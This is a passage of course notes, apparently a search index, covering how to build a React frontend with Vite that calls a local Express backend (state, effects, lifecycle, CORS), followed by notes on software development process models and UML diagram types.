server and express server simultanously, we need to run the react app in a specific port, let's say <code>5000</code>.</p> <p>In the project root folder, we update the file <code>vite.config.js</code></p> <pre><code>import { defineConfig } from 'vite'\nimport react from '@vitejs/plugin-react'\n\n// https://vite.dev/config/\nexport default defineConfig({\n  plugins: [react()],\n  server: {\n    port: 5000, // Replace with your desired port number\n  },\n})\n</code></pre> <p>Re-run <code>npm run dev</code>, it will re-start the react web app at <code>https://localhost:5000</code>.</p>"},{"location":"notes/l3_2_react/#appjsx","title":"App.jsx","text":"<p>Let's modify <code>src/App.jsx</code> to see how the web app change.</p> <pre><code>import \"./App.css\";\n\nfunction App() {\n  return (\n    &lt;div&gt;\n      &lt;h1&gt; Echo App &lt;/h1&gt;\n      &lt;div&gt; This is a test app for ESC. &lt;/div&gt;\n    &lt;/div&gt;\n  );\n}\n\nexport default App;\n</code></pre> <p>As we save the file, the browser with the web app running will automatically refresh. We see</p> <p></p> <p>(Can you modify the code so it appears similar to the above screenshot?) If we check the source of the HTML page in the browser,</p> <pre><code>&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n  &lt;head&gt;\n    &lt;script type=\"module\"&gt;import { injectIntoGlobalHook } from \"/@react-refresh\"\ninjectIntoGlobalHook(window);\nwindow.$RefreshReg$ = () =&gt; {};\nwindow.$RefreshSig$ = () =&gt; (type) =&gt; type;&lt;/script&gt;\n\n    &lt;script type=\"module\" src=\"/@vite/client\"&gt;&lt;/script&gt;\n\n    &lt;meta charset=\"UTF-8\" /&gt;\n    &lt;link rel=\"icon\" type=\"image/svg+xml\" href=\"/vite.svg\" /&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" /&gt;\n    &lt;title&gt;Vite + React&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id=\"root\"&gt;&lt;/div&gt;\n    &lt;script type=\"module\" src=\"/src/main.jsx\"&gt;&lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Nothing from the above reflects the change that we made in <code>App.jsx</code>.</p> <p>If we follow the link <code>/src/Apx.jsx</code> in the browser, we find the following code snippet in the JavaScript file.</p> <pre><code>function App() {\n  return /* @__PURE__ */ jsxDEV(\"div\", { children: [\n    /* @__PURE__ */ jsxDEV(\"h1\", { children: \" Echo App \" }, void 0, false, {\n      fileName: \"/tmp/my_react_app/src/App.jsx\",\n      lineNumber: 25,\n      columnNumber: 7\n    }, this),\n    /* @__PURE__ */ jsxDEV(\"div\", { children: \" This is a test app for ESC. \" }, void 0, false, {\n      fileName: \"/tmp/my_react_app/src/App.jsx\",\n      lineNumber: 26,\n      columnNumber: 7\n    }, this)\n  ] }, void 0, true, {\n    fileName: \"/tmp/my_react_app/src/App.jsx\",\n    lineNumber: 24,\n    columnNumber: 5\n  }, this);\n}\n_c = App;\nexport default App;\n</code></pre>"},{"location":"notes/l3_2_react/#react-js-compilation","title":"React JS Compilation","text":"<p>React frameworks focus in building applications which can be targeted for multiple platforms, i.e. web browser, windows application, mobile app and etc. It takes a single stack of source languages, i.e. JSX and CSS, compiles them into a single output. In this case, since we are using React JS to build a web app, the output will be in a single JavaScript file.</p> <p></p> <p>Image credits <code>https://nextjs.org/learn/foundations/how-nextjs-works/compiling</code></p>"},{"location":"notes/l3_2_react/#vite-preview","title":"Vite Preview","text":"<p>Vite offers a two stage compilation process for Reac.js projects. </p> <p>When a project is run using <code>npm run dev</code>, the JSX sources are structured in a similar folder hierachy as we arrange them in the project. This is for the ease for debugging. </p> <p>When we want to deploy the app to production, exposing the structure of the project might result in information exposure. </p> <p>Hence we would use the following command to generate a bundle</p> <pre><code>npm run build\n</code></pre> <p>which will trigger a full compile and bundle process and generate a <code>./dist</code> folder containing the bundled code. </p> <p>Then we could preview it using</p> <pre><code>npm run preview\n</code></pre> <p>Note: we could also change the preview port by modifying the <code>vite.config.js</code> file. </p> <pre><code>export default defineConfig({\n  plugins: [react()],\n  server: {\n    port: 5000, // Replace with your desired port number\n  },\n  preview: {\n    port: 8080,\n  },\n})\n</code></pre>"},{"location":"notes/l3_2_react/#components","title":"Components","text":"<p>Unlike Web Application developed using other frameworks, e.g. express.js, React JS develops applications with a single page in mind. <code>Component</code> is the building block of React app. <code>Component</code> in react can be written using JSX or pure React syntax <code>React.createElement</code>. We will use JSX syntax in this module. With the control of basic components, the React JS app is able to dynamically update and replace components and sub-components within the same page in the event of user interaction and data update.</p> <p>In our running example, function <code>App</code> constructs a component which is used by the <code>main.jsx</code> at the root level. Function <code>App</code> returns the static HTML code as result.</p> <p>Let's make some change to <code>App.jsx</code> as follows,</p> <pre><code>import \"./App.css\";\nimport Echo from \"./Echo\";\n\nfunction App() {\n  return (\n    &lt;div&gt;\n      &lt;h1&gt; Echo App &lt;/h1&gt;\n      &lt;Echo /&gt;\n    &lt;/div&gt;\n  );\n}\n\nexport default App;\n</code></pre> <p>In the above we import and include an <code>Echo</code> component from <code>./src/Echo.jsx</code>, which is defined as as follows,</p> <pre><code>function Echo() {\n  return &lt;div&gt;This message is defined in the Echo component.&lt;/div&gt;;\n}\n\nexport default Echo;\n</code></pre> <p>After reloading the app in the browser, we have</p> <p></p>"},{"location":"notes/l3_2_react/#top-down-design-process-static","title":"Top Down design process (static)","text":"<p>From the earlier example we see a hierachical structures in the components and elements used in our app.</p> <ul> <li>index.js</li> <li>App<ul> <li>div</li> <li>h1</li> <li>Echo<ul> <li>div</li> <li>text</li> </ul> </li> </ul> </li> </ul> <p>When we design the UI using React JS we should follow and exted the same structure.</p> <p>Suppose we would like to build a frontend app to interact with the express.js app by submitting new messages and displaying the list of submitted messages. By breaking down the UI components we might have the following</p> <p></p> <p>By following the UI structural breakdown, we modify the <code>Echo.jsx</code> as follows,</p> <pre><code>function NewMessageBar({ message, onSubmitClick }) {\n  return (\n    &lt;div&gt;\n      &lt;input type=\"text\" placeholder=\"\" value={message}&gt;&lt;/input&gt;\n      &lt;button onClick={onSubmitClick}&gt; Submit &lt;/button&gt;\n    &lt;/div&gt;\n  );\n}\n\nfunction MessageList({ messages }) {\n  let rows = [];\n  for (let i in messages) {\n    rows.push(\n      &lt;tr&gt;\n        &lt;td&gt;{messages[i].time}&lt;/td&gt;\n        &lt;td&gt;{messages[i].msg}&lt;/td&gt;\n      &lt;/tr&gt;\n    );\n  }\n  return (\n    &lt;table&gt;\n      &lt;tbody&gt;\n        &lt;tr&gt;\n          &lt;th&gt;Date Time&lt;/th&gt;\n          &lt;th&gt;Message&lt;/th&gt;\n        &lt;/tr&gt;\n        {rows}\n      &lt;/tbody&gt;\n    &lt;/table&gt;\n  );\n}\n\nfunction Echo() {\n  const messages = [\n    { time: new Date().toDateString(), msg: \"hello\" },\n    { time: new Date().toDateString(), msg: \"bye\" },\n  ];\n  return (\n    &lt;div&gt;\n      &lt;NewMessageBar message=\"\" onSubmitClick={() =&gt; {}} /&gt;\n      &lt;MessageList messages={messages} /&gt;\n    &lt;/div&gt;\n  );\n}\n\nexport default Echo;\n</code></pre> <p>In the above version of <code>Echo.jsx</code>, we define two sub components, namely <code>NewMessageBar</code> and <code>MessageList</code>. Note that both functions take some objects as the arguments, these objects arguments are referred as <code>props</code> in React's terminologies. Refer here for more details about <code>props</code> in react.</p> <ul> <li><code>NewMessageBar()</code> takes an object with two attributes, <code>message</code> and <code>onSubmitClick</code>. <code>message</code> stores the text value in the text field and <code>onSubmitClick</code> is a callback when the <code>Submit</code> button is clicked. The function returns a text input field and a button <code>Submit</code>.</li> <li><code>MessageList()</code> takes an object with an attribute, <code>messages</code> which is a list of message objects. It returns an HTML table whose rows are constructed by mapping each message in the list to a row of the table.</li> <li><code>Echo()</code>, we hard code the data (which is supposed to be returned by the AJAX call to the backend, will be implemented later), and pass them to <code>MessageList</code> component during the component construction.</li> </ul> <p>Note that we might re-write the component definition using class instead of function. Notice the difference on how props are accessed here.</p> <pre><code>class NewMessageBar extends React.Component {\n  constructor(props) {\n    this.message = props.message;\n    this.onSubmitClick = props.onSubmitClick;\n  }\n  render() {\n    return (\n      &lt;div&gt;\n        &lt;input type=\"text\" placeholder=\"\" value={this.message}&gt;&lt;/input&gt;\n        &lt;button onClick={this.onSubmitClick}&gt; Submit &lt;/button&gt;\n      &lt;/div&gt;\n    );\n  }\n}\n</code></pre> <p>It is up to you to use either <code>class</code> or <code>function</code> syntax in creating React components.</p>"},{"location":"notes/l3_2_react/#props","title":"Props","text":"<p>As shown in the earlier example, props are the objects arguments being passed to the constructor of a React Component or function argument enclosed with curly brackets. Props carried data and information passed down from the use-site, (or the parent component).</p>"},{"location":"notes/l3_2_react/#make-it-interactive-dynamic","title":"Make it interactive (dynamic)","text":"<p>Now we need to make the echo app functional. First let's make the button click to respond to the text entered in the input text field.</p> <p>We modify <code>NewMessageBar</code> as follows,</p> <pre><code>function NewMessageBar({ message, onMessageChange, onSubmitClick }) {\n  return (\n    &lt;div&gt;\n      &lt;input\n        type=\"text\"\n        placeholder=\"\"\n        value={message}\n        onChange={(e) =&gt; {\n          onMessageChange(e.target.value);\n        }}\n      &gt;&lt;/input&gt;\n      &lt;button onClick={onSubmitClick}&gt; Submit &lt;/button&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>We introduce a new props attribtue <code>onMessageChange</code> which is used as the handler for the text field <code>onChange</code> event. Without this, the text field is read-only.</p> <p>Next we modify the <code>Echo</code> function as follows,</p> <pre><code>function Echo() {\n  const [msgTxt, setMsgTxt] = useState(\"\");\n  function handleSubmitClick() {\n    alert(\"clicked \" + msgTxt);\n  }\n  const messages = [\n    { time: new Date().toDateString(), msg: \"hello\" },\n    { time: new Date().toDateString(), msg: \"bye\" },\n  ];\n  return (\n    &lt;div&gt;\n      &lt;NewMessageBar\n        message={msgTxt}\n        onMessageChange={setMsgTxt}\n        onSubmitClick={handleSubmitClick}\n      /&gt;\n      &lt;MessageList messages={messages} /&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>and import the following:</p> <pre><code>import { useState } from \"react\";\n</code></pre>"},{"location":"notes/l3_2_react/#state","title":"State","text":"<p>The <code>useState(initialState)</code> is one of React Hooks which allows you to have a getter and setter without writing a class. This function returns two values (in the previous example, the two values are captured in <code>msgTxt</code> and <code>setMsgTxt</code>). The first value is the current state which in the first render will have the <code>initialState</code> value. The second \"value\" is the setter function that lets you update the state and trigger a re-render phase of React lifecycle (lifecycle will be discussed later).</p> <p>In addition, we define a function <code>handleSubmitClick</code> which is used as the event handler of the <code>Submit</code> button click. Now we can interact with the app by entering the text in the message text field and pressing the button to trigger a pop up.</p>"},{"location":"notes/l3_2_react/#interfacing-with-the-backend-app","title":"Interfacing with the backend app","text":"<p>Lastly we need to remove the hard-coded data and make use the data returned by the backend API end-point. Adjust the <code>Echo</code> function as follows:</p> <pre><code>function Echo() {\n  const [msgTxt, setMsgTxt] = useState(\"\");\n  const [messages, setMessages] = useState([]);\n\n  function handleSubmitClick() {\n    alert(\"clicked \" + msgTxt);\n    submitNewMessage();\n  }\n\n  async function submitNewMessage() {\n    const response = await fetch(`http://localhost:3000/echo/submit`, {\n      method: \"POST\",\n      body: `msg=${msgTxt}`,\n      headers: {\n        \"Content-type\": \"application/x-www-form-urlencoded\",\n      },\n    });\n    const text = await response.text();\n    const json = JSON.parse(text);\n    setMessages(json);\n  }\n\n  return (\n    &lt;div&gt;\n      &lt;NewMessageBar\n        message={msgTxt}\n        onMessageChange={setMsgTxt}\n        onSubmitClick={handleSubmitClick}\n      /&gt;\n      &lt;MessageList messages={messages} /&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>The changes we made include</p> <ul> <li>remove the hard coded messages.</li> <li>introduce a new state <code>[messages, setMessages]</code>.</li> <li>define a function <code>submitNewMessage()</code> which make the HTTP POST api request to the backend app and update the message.</li> <li>update the body of <code>handleSubmitClick()</code> to incorporate <code>submitNewMessage()</code>.</li> </ul> <p>When the button is clicked, a sequence of operations were carried out in the following order.</p> <ol> <li><code>handleSubmitClick()</code> invokes <code>submitNewMessage()</code></li> <li><code>submitNewMessage()</code> make the api call</li> <li>when the api call returns the result, the body text is extracted and parsed as JSON.</li> <li><code>setMessages()</code> update the messages state, which triggers the re-rendering of the <code>Echo()</code> component and all of its children (<code>NewMessageBar</code> and <code>MessageList</code>).</li> </ol> <p>Next, we can reuse our previous AJAX demo project <code>my_mysql_app</code> as the backend of our react frontend. In separate terminal, run <code>npm start</code> for <code>my_mysql_app</code> for the backend and <code>npm start</code> for the react app (make sure that they run in separate port, 3001 for react and 3000 for express if you follow this note).</p> <p>We will encounter an error of the api Call. By checking the console in the browser, we find that it is related to the Cross Origin Resource Sharing (CORS) restriction, which prevents the JS from React app to pull data from an exernal app.</p> <p>To lift the restriction, we modify the router code at the backend app, i.e. <code>my_mysql_app</code>.</p> <p>For all the AJAX call end-points to be accessed by our react app (which is running on port 3001), we add the following statement before the <code>res.send()</code> is called.</p> <pre><code>res.set(\"Access-Control-Allow-Origin\", \"http://localhost:5000\");\n</code></pre> <p>Lastly, let's make the app to displays all the existing messages when it is firstly loaded. Naively, we might added the following function definitions and function call statements before the <code>return</code> statement in the <code>Echo()</code> function.</p> <pre><code>    async function submitNewMessage() { ... } // existing\n    async function initMessages() { // newly added\n        const response = await fetch(`http://localhost:3000/echo/all`);\n        const text = await response.text();\n        const json = JSON.parse(text);\n        setMessages(json);\n    }\n    initMessages(); // newly added, causing loop\n    return ( ... ); // existing\n</code></pre> <p>With this fix, our App seems to get into an infinite loop. This is because <code>initMessages()</code> is now part of the render phase routine of the <code>Echo</code> component. When the <code>Echo</code> is rendered, the <code>setMessages</code> is invoked, which causes the component to re-render.</p>"},{"location":"notes/l3_2_react/#life-cycle-of-react-components","title":"Life Cycle of React Components","text":"<p>In order to fix this issue, we need to understand the life cycle of React Component.</p> <p></p> <p>image credits <code>https://levelup.gitconnected.com/componentdidmakesense-react-lifecycle-explanation-393dcb19e459</code></p> <p>When a React Component is spawned, server methods are called at the server end (i.e. when our react app is hosted). After which, it calls <code>componentDidMount</code>, then goes into a kind of loop driven by the changes of states or props of react component. Each change of states or props will re-renders the component in the browser. The loop goes on until it unmount, (i.e. the component is destroyed).</p> <p>To access each of the stages of the React Component, let's rewrite the <code>Echo</code> component in class style</p> <pre><code>import { Component } from \"react\";\n\nclass Echo extends Component {\n  constructor(props) {\n    super(props);\n    this.state = { msgTxt: \"\", messages: [] };\n  }\n\n  componentDidMount() {}\n\n  componentDidUpdate() {}\n\n  async submitNewMessage() {\n    const response = await fetch(`http://localhost:3000/echo/submit`, {\n      method: \"POST\",\n      body: `msg=${this.state.msgTxt}`,\n      headers: {\n        \"Content-type\": \"application/x-www-form-urlencoded\",\n      },\n    });\n    const text = await response.text();\n    const json = JSON.parse(text);\n    this.setMessages(json);\n  }\n\n  setMsgTxt(s) {\n    this.setState({ msgTxt: s, messages: this.state.messages });\n  }\n\n  setMessages(l) {\n    this.setState({ msgTxt: this.state.msgTxt, messages: l });\n  }\n\n  handleSubmitClick() {\n    this.submitNewMessage();\n  }\n\n  render() {\n    return (\n      &lt;div&gt;\n        &lt;NewMessageBar\n          message={this.state.msgTxt}\n          onMessageChange={(s) =&gt; this.setMsgTxt(s)}\n          onSubmitClick={() =&gt; this.handleSubmitClick()}\n        /&gt;\n        &lt;MessageList messages={this.state.messages} /&gt;\n      &lt;/div&gt;\n    );\n  }\n}\n</code></pre> <p>In the above version, we refactor the <code>useState()</code> parts by using the inherited attribute of the <code>Component</code> class: <code>state</code> and <code>setState()</code>. In the above example, we put <code>msgTxt</code> and <code>messages</code> in <code>this.state</code> and write <code>setMsgTxt</code> and <code>setMessages</code> methods using <code>this.setState</code>. Since functions are different from method internally, we need to turn the props arguments into lambdas, e.g. <code>onMessageChange={(s) =&gt; this.setMsgTxt(s)}</code> instead of <code>onMessageChange={setMsgTxt}</code>. Finally we override the <code>componentDidMount</code> and <code>componentDidUpdate</code> methods.</p>"},{"location":"notes/l3_2_react/#exercise-non-graded","title":"Exercise (Non Graded)","text":"<p>Add some log messages to the <code>constructor</code>, <code>componentDidUpdate</code>, <code>componentDidMount</code> and <code>render</code>. Run the program to observe the order of the log messages being printed. Can you identify which message is printed from which part of the life cycle?</p> <p>As suggested by the life cycle, it is better to initilize the state outside the loop, i.e. <code>componentDidMount</code>.</p> <p>Hence we change the <code>componentDidMount</code> as follows, and introduce a new function to retrieve all existing messages from the API and update the state.</p> <pre><code>    async initMessages() {\n        const response = await fetch(`http://localhost:3000/echo/all`);\n        const text = await response.text();\n        const json = JSON.parse(text);\n        this.setMessages(json);\n    }\n\n    componentDidMount() {\n        this.initMessages();\n    }\n</code></pre> <p>With this change, the App behaves as what we want.</p>"},{"location":"notes/l3_2_react/#effect","title":"Effect","text":"<p>Some of us might argue, rewriting the component in the class form allows us to access the different stage of the life-cycle. The code could be too verbose.</p> <p>To achieve the same result in the function-form component, we need to use the <code>useEffect</code> hook.</p> <p>Recall the earlier version in function-form.</p> <pre><code>function Echo() {\n  const [msgTxt, setMsgTxt] = useState(\"\");\n  function handleSubmitClick() {\n    submitNewMessage();\n  }\n  const [messages, setMessages] = useState([]);\n\n  async function submitNewMessage() {\n    const response = await fetch(`http://localhost:3000/echo/submit`, {\n      method: \"POST\",\n      body: `msg=${msgTxt}`,\n      headers: {\n        \"Content-type\": \"application/x-www-form-urlencoded\",\n      },\n    });\n    const text = await response.text();\n    const json = JSON.parse(text);\n    setMessages(json);\n  }\n\n  useEffect(() =&gt; {\n    // useEffect\n    console.log(\"from effect\");\n  });\n\n  return (\n    &lt;div&gt;\n      &lt;NewMessageBar\n        message={msgTxt}\n        onMessageChange={setMsgTxt}\n        onSubmitClick={handleSubmitClick}\n      /&gt;\n      &lt;MessageList messages={messages} /&gt;\n    &lt;/div&gt;\n  );\n}\n</code></pre> <p>The statement calling <code>useEffect</code> defines a call-back to be called every time the component re-renders. We can restrict the call-back to be triggered only when certain states have updated, e.g.</p> <pre><code>useEffect(() =&gt; {\n  console.log(\"from effect\");\n}, [msgTxt]);\n</code></pre> <p>will be triggered whenever <code>msgTxt</code> state changes.</p> <p>If the 2<sup>nd</sup> argument is an empty list <code>[]</code>. the call-back will only be triggered when the component is mounted. Hence to achieve what we want, i.e. to get all the existing messages and assign them to the state <code>messages</code>, we need to include the following in the body of the <code>Echo</code> function.</p> <pre><code>async function initMessages() {\n  const response = await fetch(`http://localhost:3000/echo/all`);\n  const text = await response.text();\n  const json = JSON.parse(text);\n  setMessages(json);\n}\nuseEffect(() =&gt; {\n  initMessages();\n}, []);\n</code></pre> <p>We could think of <code>useEffect</code> with only 1 argument is behaving like <code>componentDidUpdate</code>. <code>useEffect</code> with a 2<sup>nd</sup> argument as a non empty list is behaving like <code>componentDidUpdate</code> with conditional update (depending on whether the given state has changed). When <code>useEffect</code> is used with a 2<sup>nd</sup> argument as an empty list it is behaving like <code>componentDidMount</code>.</p>"},{"location":"notes/l3_2_react/#further-reading","title":"Further Reading","text":"<ol> <li>Building a React App from Scracth  <code>https://react.dev/learn/build-a-react-app-from-scratch</code></li> <li>Thinking in React <code>https://react.dev/learn/thinking-in-react</code></li> <li>React JS and Express JS <code>https://www.freecodecamp.org/news/create-a-react-frontend-a-node-express-backend-and-connect-them-together-c5798926047c/</code></li> <li>React JS life cycle <code>https://levelup.gitconnected.com/componentdidmakesense-react-lifecycle-explanation-393dcb19e459</code></li> <li>Multi page React <code>https://www.geeksforgeeks.org/how-to-create-a-multi-page-website-using-react-js/</code></li> <li>Multi page with state <code>https://www.microverse.org/blog/how-to-get-set-up-with-react-redux-in-your-next-multi-page-project</code></li> <li>React JS and Express JS with Login and Token authentication <code>https://www.digitalocean.com/community/tutorials/how-to-add-login-authentication-to-react-applications</code></li> </ol>"},{"location":"notes/l3_2_take_home_test/","title":"L3 2 take home test","text":"<p>l3_2_</p>"},{"location":"notes/l4_1_software_development_process/","title":"50.003 - Software Development Process","text":""},{"location":"notes/l4_1_software_development_process/#learning-outcomes","title":"Learning Outcomes","text":"<p>By the end of this unit, you should be able to</p> <ol> <li>Articulate the different types of Software development process.</li> <li>Apply different types of software development process based on the project constraints and criteria.</li> <li>Name different types UML models.</li> <li>Identify the right UML models to be applied based on the software development phases. </li> </ol>"},{"location":"notes/l4_1_software_development_process/#what-is-software-development","title":"What is Software Development","text":"<p>In modern days, software development is a process of solving existing (business, organizational, personal) problems by applying software engineering techniques and process to develop a software solution. </p> <p>The main objective is to identify the cause of the pain points, gaps or inefficacy in process, then to design  and (re-)develop a solution that operates around a set of software tools so as to address the pain points, bridge the gaps and fix the inefficacy. </p> <p>Besides the functional needs, there exists non-functional needs to be satisfied. For instance, the end product must be easy to modify, update and maintain without major system overhaul, the end product must be user friendly, with a flat learning curve, and the end product must be highly secured and robust.</p>"},{"location":"notes/l4_1_software_development_process/#what-is-software-development-process","title":"What is Software Development Process","text":"<p>Software Development Process (AKA Software Development Life Cycle) is an approach to organize the different stages/steps required to develop a software based solution to address the user needs. </p> <p>After decades of software development, software engineers estalished a common consensus that most of the software development should include the following phases. </p> <ol> <li>Requirement Analysis </li> <li>Design</li> <li>Development</li> <li>Testing </li> <li>Deployment</li> </ol>"},{"location":"notes/l4_1_software_development_process/#requirement-analysis","title":"Requirement Analysis","text":"<p>It is sometimes divided into requirement gathering and analysis.  For this module, we keep it simple by comining these two phases.</p> <p>In this phase, the system analysts or designers (and sometimes the software developers) research and study the existing problems (and the user needs) and determine what the software system can do to help. At the end of this phase, a set of system requirements is documented and agreed by both the system analysts and the project stack holders.</p>"},{"location":"notes/l4_1_software_development_process/#design","title":"Design","text":"<p>In this phase, the system analysts or designers work closely with the software developers sketch out the overall structure, features, processes, user-interaction and information flows in the software system to be developed. The goal is to </p> <ol> <li>establish a common design among the design and development teams.</li> <li>check for feasibility of the potential solution alternatives. </li> <li>divde the system to be developed into parts so that they could be tackled in parallel or in different phases.</li> <li>plan out the required resource and effort to develop the system parts.</li> <li>prioritize and fix an order of development. </li> </ol>"},{"location":"notes/l4_1_software_development_process/#development","title":"Development","text":"<p>In this phase, the developers implement the software system parts according to the design. </p>"},{"location":"notes/l4_1_software_development_process/#testing","title":"Testing","text":"<p>In this phase, sometimes interwined with the development phase, the software developers perform testing to verify that the developed software system parts are functioning according to the system requirements. </p>"},{"location":"notes/l4_1_software_development_process/#deployment","title":"Deployment","text":"<p>In this phase, the tested software system is setup and installed in the target environment. The new operation processes related to the new system is setup and communicated to the end users.  </p>"},{"location":"notes/l4_1_software_development_process/#types-of-software-development-processes","title":"Types of Software Development Processes","text":"<p>Based on how the project development is organized and divided by mixing the above-mentioned phases, there are a few commonly adopted models.  </p>"},{"location":"notes/l4_1_software_development_process/#waterfall-model","title":"Waterfall model","text":"<p>In this model, we simply break down the project by the above-mentioned phases and follow the order of execution as follows</p> <pre><code>flowchart TB;\n    analysis[\"Requirement Analysis\"] --&gt; Design --&gt; Development --&gt; Testing --&gt; Deployment</code></pre> <p>Although there are \"back-flow\" activities some times, for example, when during the design phase, the team discover a new issue which requires the project stack holder's clarification, the related activities in \"Requirement Analysis\" phase will be re-conducted. Similarly, during development and testing phases, when new constraints are encountered, the design has to be revisited and adjusted. These \"back-flow\" activities should remain as ad-hoc requests. In general, a project executed in waterfall model should not roll back to the earlier phases.</p> <p>One major advantage of the Waterfall model is predictability. By breaking down the project in this manner, we only need to execute each phase once. We often believe (sometimes try to deceive ourselves) that we could prescribe a precise schedule for the system development. </p> <p>However in reality, this level of predictability does not exist.  It is hard to provide an accurate prediction on how many man-day does a software development project require, even though the project comes with a fixed set of requirements. </p> <p>This is one of the main reasons why Waterfall model has been avoided by many projects. The break down by analysis-design-develop-test-deployment in one-shot gives us a fallacy, which tries to define \"progress\" as \"moving from phase to phase\". However, we are not sure the progress has been made until some code is written and tested against the requirements. </p>"},{"location":"notes/l4_1_software_development_process/#iterative-model","title":"Iterative model","text":"<p>In an iterative model, unlike Waterfall model, a project is divided into multiple iterative cycles. Each cycle consists of a mini round of ananlysis-design-develop-test sequence. In each cycle, a subset of system features is scoped, design and develop. Each cycle must be time-boxed. Any slip of schedule could result in postponing some feature to the next iteration.  At the begining of each iteration, the team ( maybe with the users) discuss what to be built in this iteration. At the end of the iteration, the team review (maybe with the users) the features have been delivered in this iteration and make some adjustment to address the new issues found in the upcoming iteration. </p> <pre><code>flowchart TB;\n    subgraph iteration one \n    analysis1[\"Requirement Analysis I1\"] --&gt; design1[\"Design I1\"] --&gt; development1[\"Development I1\"]--&gt; testing1[\"Testing I1\"] --&gt; release1[\"Release I1\"]\n    end\n    subgraph iteration two\n    analysis2[\"Requirement Analysis I2\"] --&gt; design2[\"Design I2\"] --&gt; development2[\"Development I2\"]--&gt; testing2[\"Testing I2\"] --&gt; release2[\"Release I2\"]\n    end \n    subgraph iteration three\n    analysis3[\"Requirement Analysis I3\"] --&gt; dotdotdot[\"...\"] \n    end\n    release1 --&gt; analysis2\n    release2 --&gt; analysis3</code></pre> <p>An advantage of the Iterative model over Waterfall model is progress.  At the end of each iteration, the team and the users both see progress as features are delievered.  Another advantage is adaptability. The project development can adapt to the changes of requirements and external factors. </p>"},{"location":"notes/l4_1_software_development_process/#agile-model","title":"Agile \"model\"","text":"<p>In the recent decade, the Agile methods gained popularity.  However there exists no Agile model. What was defined and presented is a manisfesto with 12 principles.</p> <p><pre><code>https://agilemanifesto.org/principles.html\n</code></pre> There is no concrete method or process defined. The central idea is that there exists a key factor to the success of a project, which is how well the team of people work together. </p> <p>There are many instances of Agile methods exist. For instance,</p> <ol> <li>Extreme Programming </li> <li>Scrum</li> <li>...</li> </ol> <p>Let's take Extreme Programming for example. In this Agile method, the team of people is assumed to have equal of similar skill levels. They must be co-located together to establish effective communication. The project is divided into smaller releases in weekly, bi-weekly or monthly cycles. Pair programming is encouraged which reduces the chance of being interupted and reduce the need of code review and excessive documentation. Each feature is implemented using the simpliest solution as possible. Automated testin and continuous integration must be put in-place. </p> <p>In many Agile methods, one common assumption is that there exist frequent changes to the project requirements. Thus the smaller release cycle, the active engagement of the users help to prevent useless features being developed.  </p> <p>Note that the low documentation Agile methods is a by-product of having active user engagement, small co-located team and highly automated software development processes.  Low documentation does not mean no documentation. </p>"},{"location":"notes/l4_1_software_development_process/#uml-models","title":"UML Models","text":"<p>UML is a short-form for Unified Modelling Language. Though it is a language, it is considered a graphical tool.  It consists a set of (mostly) graph based tools that allows us to build models for analysis and design. Most of these tools are used for building software systems, whilst some even go beyond to be applied in other engineering domains.</p> <p> Image source: https://en.wikipedia.org/wiki/Unified_Modeling_Language</p> <p>Based on functionalities, UML models can be classified into two major categories,  Behaviour Diagrams and Structure diagrams</p>"},{"location":"notes/l4_1_software_development_process/#structure-diagrams","title":"Structure Diagrams","text":"<p>Structure diagrams define or describe the structure of a target system, which could be a program, a software system, or even a physical product. </p> <ul> <li> <p>A Class Diagram describes the structure of a software system by modelling each sub components as an instance of a class. Following the idea of OOP, instances of a class share the same internal structures, i.e. a set of properties and a set of methods. We will go into details of class diagram in the week 2 lessons. </p> </li> <li> <p>A Composite Structure Diagram is similar to a class diagram but focusing on the details with the class/component internals. </p> </li> </ul> <p></p> <p>Image source (https://www.visual-paradigm.com/guide/uml-unified-modeling-language/what-is-composite-structure-diagram/)</p> <ul> <li> <p>A Package Diagram describes the layers of a (software) systems. </p> </li> <li> <p>Unlike the class diagram captures the static relation among various components in a system, an object diagram describe a the running objects/compoents in the system in a particular instance. </p> </li> <li> <p>A deployment diagram captures the physical running system processes. It can be used to model the overall architecture of a softare system.</p> </li> </ul> <p> Image source (https://en.wikipedia.org/wiki/Deployment_diagram)</p>"},{"location":"notes/l4_1_software_development_process/#behavior-diagrams","title":"Behavior Diagrams","text":"<p>Behavior Diagrams define or describe the behavior of a target system. </p> <ul> <li> <p>If a class in a class diagram has specific order or sequence of changes of properties, we use a state machine diagram to augment the class diagram. </p> </li> <li> <p>A use case diagram describes how users might interact with the target system. It is often augemented with a set of use cases (or use case texts) to capture a sceniaro during the user-system interactions. We will dive into the details of use case and use case diagram in the next lesson.</p> </li> <li> <p>A sequence diagram shows the internal interactions between various sub-components within the target system to support a system feature or a system process. We will study sequence diagram in the 2<sup>nd</sup> week of this module.</p> </li> <li> <p>An activity diagram is a kind of flow chart. It is used to model the actions or flows of data in a system. It is often used in describing a business process. </p> </li> </ul> <p> Image source (https://en.wikipedia.org/wiki/Activity_diagram)</p>"},{"location":"notes/l4_1_software_development_process/#fitting-uml-models-into-sdlc","title":"Fitting UML models into SDLC","text":""},{"location":"notes/l4_1_software_development_process/#requirement-analysis_1","title":"Requirement Analysis","text":"<p>The common tool used in this phase is the use case diagram, which is more user and feature oriented. The goal is to capture the system requirement in a less ambiguous way so that a common understanding between the users and the project team can be established. The use case diagrams and documents can be also served as the starting points for conducting system and end-to-end testing during the later phases of the software development process. </p> <p>Note that in some rare occasion class diagram and sequence diagrams could be used to explain to the project stack holders how the system is being developed. </p> <p>Another point to take note is that the focus for requirement analysis is to establish the common understanding of the system requirements. Use case is one of the tools but not the only tool. Sometimes we use non-UML models if it conveys the right messages, e.g. screen flow diagram, user story board etc.</p>"},{"location":"notes/l4_1_software_development_process/#design_1","title":"Design","text":"<p>In this phase, the commonly used UML models are class diagram, deployment diagrams and sequence diagrams. </p>"},{"location":"notes/l4_1_software_development_process/#development-and-test","title":"Development and Test","text":"<p>During coding phase, the developers implement the designated parts based on the use case documents, the sequence diagram and class diagram. </p> <p>Note that the use of class diagram does not dictate the choice of programming languages and frameworks. Though class diagrams are presented in an OOP style, they often describe the design in terms of how different components are related/interfaced with each other. The actual implementation can be done in non OOP programming language and framework. </p> <p>Sequence diagrams specifies how the methods and API invocation take place given a particular use case scenario. They serve as a base reference of how to develop unit tests and integration tests. 